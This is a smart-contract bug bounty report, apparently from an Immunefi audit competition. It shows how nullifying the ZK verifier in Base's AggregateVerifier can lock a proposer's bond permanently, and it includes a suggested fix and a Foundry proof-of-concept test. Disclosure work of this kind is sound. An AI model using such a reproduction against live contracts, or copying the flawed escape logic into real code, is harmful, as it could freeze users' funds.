# 74351 sc low bond permanently locked after zk verifier nullification in proof threshold 2 game

**Submitted on Apr 21st 2026 at 22:40:33 UTC by @M1S00 for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #74351
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/base/contracts/tree/v8.1.0/src/multiproof>
* **Impacts:**
  * Permanent freezing of funds in the bridge or in dispute game bonds with no available recovery path

## Description

In `AggregateVerifier.sol`, when a game is configured with `PROOF_THRESHOLD = 2` (requiring both a TEE proof and a ZK proof before resolution), a soundness-alert nullification of the ZK verifier can leave the game in a permanently unresolvable state. Once the ZK verifier is nullified via `nullify()`, the ZK verifier's `nullified` flag is set to `true` for the entire shared verifier contract, preventing any future ZK proof from being accepted. At the same time, `proofCount` drops back to 1, which is below the threshold of 2, so `resolve()` is blocked. The only intended escape path in `claimCredit()` - a 14-day unconditional timeout - is gated behind `expectedResolution == type(uint64).max`, but after nullification `expectedResolution` is set to a concrete future timestamp (`now + SLOW_FINALIZATION_DELAY`), meaning the 14-day branch is never reached. The result is that the honest TEE proposer's full bond is locked in `DelayedWETH` forever with no recovery path in the protocol.

## Vulnerable File and Code

**File:** `src/multiproof/AggregateVerifier.sol`\
**Function:** `claimCredit()` - Lines 603–619

```solidity
// src/multiproof/AggregateVerifier.sol

function claimCredit() external nonReentrant {
    // The bond must not have been claimed yet.
    if (bondClaimed) revert NoCreditToClaim();

    // The game must have resolved or 14 days have passed since creation.
    // 14 days chosen as the proof system should have progressed enough so this can't update the
    // anchor state registry anymore.
    if (expectedResolution.raw() != type(uint64).max) {
        if (resolvedAt.raw() == 0) revert GameNotResolved();   // <-- BUG: always reverts, escape never reached
    } else {
        if (block.timestamp < createdAt.raw() + 14 days) revert GameNotOver();
    }
    ...
}
```

**Why this is vulnerable:** After ZK nullification, `expectedResolution` is set to `now + 7 days` (a real timestamp, not `type(uint64).max`), so the code always enters the first branch and reverts with `GameNotResolved`. The 14-day escape hatch in the `else` branch - which was designed as a last-resort bond recovery - is only reachable when `expectedResolution == type(uint64).max` (i.e. zero proofs submitted). The case of one remaining proof with a permanently paused verifier was never accounted for.

## Impact

An honest TEE proposer who posted a legitimate L2 output root proposal and funded the required bond has their bond permanently frozen in `DelayedWETH` with no on-chain recovery path. This occurs without any fault by the proposer: the trigger is a ZK soundness alert in the shared verifier, which is an independent event. The bond amount is determined by `DisputeGameFactory.initBonds`, a value set by the protocol (expected to be in the range of ETH). Since the lock is permanent - no timeout, no admin function, no upgrade path within the game contract itself - the proposer suffers a 100% unrecoverable loss of their bond. All `PROOF_THRESHOLD=2` games are affected simultaneously if the shared ZK verifier is ever nullified.

## Recommended Fix

In `claimCredit()`, extend the 14-day escape to also apply when `expectedResolution` is a concrete timestamp but the game is unresolved after 14 days:

```solidity
// FIXED
if (expectedResolution.raw() != type(uint64).max) {
    if (resolvedAt.raw() == 0) {
        // Allow bond recovery after 14 days even if stuck (e.g. verifier nullified)
        if (block.timestamp < createdAt.raw() + 14 days) revert GameNotResolved();
    }
} else {
    if (block.timestamp < createdAt.raw() + 14 days) revert GameNotOver();
}
```

## Proof of Concept

### Steps to Reproduce

#### Run the PoC

Save the below PoC under `test/multiproof/AggregateVerifier.t.sol`:

```bash
forge test --match-test "test_poc_bondPermanentlyLockedAfterZKNullification" -vvv
```

#### Expected output

```
┌──(m1s0㉿M1S0)-[~/Desktop/BugBounty/Web3/Smart Contract/contracts-8.1.0]
└─$ forge test --match-test "test_poc_bondPermanentlyLockedAfterZKNullification" -vvv 
[⠆] Compiling...
No files changed, compilation skipped

Ran 1 test for test/multiproof/AggregateVerifier.t.sol:AggregateVerifierBondLockPoC
[PASS] test_poc_bondPermanentlyLockedAfterZKNullification() (gas: 659618)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.83ms (660.77µs CPU time)

Ran 1 test suite in 20.08ms (2.83ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
┌──(m1s0㉿M1S0)-[~/Desktop/BugBounty/Web3/Smart Contract/contracts-8.1.0]
└─$

```

#### Step-by-step attack flow demonstrated by the PoC

{% stepper %}
{% step %}

## 1. A `PROOF_THRESHOLD=2` `AggregateVerifier` game is created via `DisputeGameFactory`

{% endstep %}

{% step %}

## 2. The TEE prover creates the game and submits a TEE proof

* `proofCount = 1`
* 1 ETH locked in `DelayedWETH`
  {% endstep %}

{% step %}

## 3. A ZK prover submits a ZK proof

* `proofCount = 2`
* `expectedResolution = now + 1 day`
  {% endstep %}

{% step %}

## 4. `nullify()` is called with a competing ZK proof claiming a different intermediate root is correct (a soundness alert)

* `proofCount` drops back to `1`
* `zkVerifier.nullified` is set to `true` permanently
* `expectedResolution` is reset to `now + 7 days` (concrete timestamp, NOT `type(uint64).max`)
  {% endstep %}

{% step %}

## 5. After 7+ days (timer expires, `gameOver() == true`)

* `resolve()` → **REVERTS** `NotEnoughProofs` (1 < 2)
* `verifyProposalProof(new ZK proof)` → **REVERTS** `Nullified()` (verifier is paused)
* `claimCredit()` → **REVERTS** `GameNotResolved` (escape hatch unreachable)
  {% endstep %}

{% step %}

## 6. After 14+ days

* `claimCredit()` → **STILL REVERTS** `GameNotResolved`
* `delayedWETH.balanceOf(game) == 1 ETH` - bond never moved
  {% endstep %}

{% step %}

## 7. The game is permanently frozen

The TEE prover's bond is unrecoverable.
{% endstep %}
{% endstepper %}

## PoC Code

Save the below PoC under `test/multiproof/AggregateVerifier.t.sol`:

```solidity
// ============================================================
// PoC: Bond permanently locked after ZK verifier nullification
// in a PROOF_THRESHOLD=2 game.
//
// Bug: After ZK nullification, proofCount drops to 1 and
// expectedResolution is set to a concrete timestamp (NOT
// type(uint64).max). The claimCredit() 14-day escape hatch
// only fires when expectedResolution == type(uint64).max, so
// the bond is forever trapped in DelayedWETH with no recovery.
// ============================================================
contract AggregateVerifierBondLockPoC is BaseTest {
    // A second game type with PROOF_THRESHOLD = 2
    GameType internal constant GAME_TYPE_2 = GameType.wrap(622);

    function setUp() public override {
        super.setUp();

        // Deploy a new AggregateVerifier implementation with PROOF_THRESHOLD = 2.
        // Uses the same shared teeVerifier / zkVerifier instances as BaseTest.
        AggregateVerifier impl2 = new AggregateVerifier(
            GAME_TYPE_2,
            IAnchorStateRegistry(address(anchorStateRegistry)),
            IDelayedWETH(payable(address(delayedWETH))),
            IVerifier(address(teeVerifier)),
            IVerifier(address(zkVerifier)),
            TEE_IMAGE_HASH,
            AggregateVerifier.ZkHashes(ZK_RANGE_HASH, ZK_AGGREGATE_HASH),
            CONFIG_HASH,
            L2_CHAIN_ID,
            BLOCK_INTERVAL,
            INTERMEDIATE_BLOCK_INTERVAL,
            2 // PROOF_THRESHOLD = 2
        );

        factory.setImplementation(GAME_TYPE_2, IDisputeGame(address(impl2)));
        factory.setInitBond(GAME_TYPE_2, INIT_BOND);

        // Make GAME_TYPE_2 the respected type so wasRespectedGameTypeWhenCreated = true.
        anchorStateRegistry.setRespectedGameType(GAME_TYPE_2);
    }

    /// @notice Helper to create a PROOF_THRESHOLD=2 game via the factory.
    function _createGame2(
        address creator,
        Claim rootClaim,
        uint256 l2BlockNumber,
        address parentAddress,
        bytes memory proof
    )
        internal
        returns (AggregateVerifier)
    {
        bytes memory intermediateRoots =
            abi.encodePacked(_generateIntermediateRootsExceptLast(l2BlockNumber), rootClaim.raw());
        bytes memory extraData = abi.encodePacked(uint256(l2BlockNumber), parentAddress, intermediateRoots);
        vm.deal(creator, INIT_BOND);
        vm.prank(creator);
        return AggregateVerifier(
            address(factory.createWithInitData{ value: INIT_BOND }(GAME_TYPE_2, rootClaim, extraData, proof))
        );
    }

    function test_poc_bondPermanentlyLockedAfterZKNullification() public {
        // STEP 1: TEE prover creates game and submits TEE proof
        currentL2BlockNumber += BLOCK_INTERVAL;
        Claim rootClaim = Claim.wrap(keccak256(abi.encode(currentL2BlockNumber)));
        bytes memory teeProof = _generateProof("tee-proof", AggregateVerifier.ProofType.TEE);

        AggregateVerifier game =
            _createGame2(TEE_PROVER, rootClaim, currentL2BlockNumber, address(anchorStateRegistry), teeProof);

        assertEq(game.proofCount(), 1, "Step 1: proofCount should be 1 after TEE proof");
        assertEq(delayedWETH.balanceOf(address(game)), INIT_BOND, "Step 1: bond locked in DelayedWETH");
        assertEq(game.bondRecipient(), TEE_PROVER, "Step 1: TEE prover is bond recipient");

        // STEP 2: ZK prover submits ZK proof
        bytes memory zkProof = _generateProof("zk-proof", AggregateVerifier.ProofType.ZK);
        _provideProof(game, ZK_PROVER, zkProof);
        assertEq(game.proofCount(), 2, "Step 2: proofCount should be 2 after ZK proof");

        // STEP 3: Soundness alert - nullify() with competing ZK proof
        uint256 intermediateRootIndex = 0;
        bytes32 differentIntermediateRoot = bytes32(uint256(0xdeadbeef1337));
        bytes memory nullifyProofBytes = abi.encodePacked(uint8(AggregateVerifier.ProofType.ZK), bytes1(0x01));
        game.nullify(nullifyProofBytes, intermediateRootIndex, differentIntermediateRoot);

        // VERIFY THE STUCK STATE
        assertEq(game.proofCount(), 1, "After nullify: proofCount dropped back to 1");
        assertTrue(zkVerifier.nullified(), "After nullify: ZK verifier is permanently paused");
        assertNotEq(
            game.expectedResolution().raw(),
            type(uint64).max,
            "expectedResolution is a concrete timestamp, 14-day escape hatch will never fire"
        );
        assertEq(game.resolvedAt().raw(), 0, "Game is unresolved");

        // STEP 4a: Wait until gameOver()
        vm.warp(block.timestamp + 7 days + 1);
        assertTrue(game.gameOver(), "gameOver() is true - timer expired");

        // PATH 1: resolve() fails
        vm.expectRevert(AggregateVerifier.NotEnoughProofs.selector);
        game.resolve();

        // PATH 2: New ZK proof fails - verifier paused
        bytes memory newZkProof = _generateProof("new-zk-proof-2", AggregateVerifier.ProofType.ZK);
        vm.prank(ZK_PROVER);
        vm.expectRevert();
        game.verifyProposalProof(newZkProof);

        // PATH 3: claimCredit() fails
        vm.expectRevert(GameNotResolved.selector);
        game.claimCredit();

        // STEP 4b: Even after 14 days - escape hatch still blocked
        vm.warp(block.timestamp + 14 days);
        vm.expectRevert(GameNotResolved.selector);
        game.claimCredit();

        // CONCLUSION: Bond is permanently locked
        assertEq(
            delayedWETH.balanceOf(address(game)),
            INIT_BOND,
            "BOND PERMANENTLY LOCKED: full bond still in DelayedWETH after 14+ days"
        );
        assertEq(game.resolvedAt().raw(), 0, "Game never resolved - no path to resolution exists");
    }
}
```
